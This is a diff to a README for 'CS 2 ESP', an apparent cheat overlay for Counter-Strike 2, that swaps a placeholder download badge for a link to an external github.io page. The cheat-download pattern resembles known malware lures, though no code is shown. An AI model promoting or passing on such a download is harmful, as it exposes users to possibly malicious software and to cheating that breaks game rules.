@@ -6,7 +6,7 @@ CS 2 ESP is an advanced overlay for Counter-Strike 2 that provides detailed on-s
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://cs2-esp-windows.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
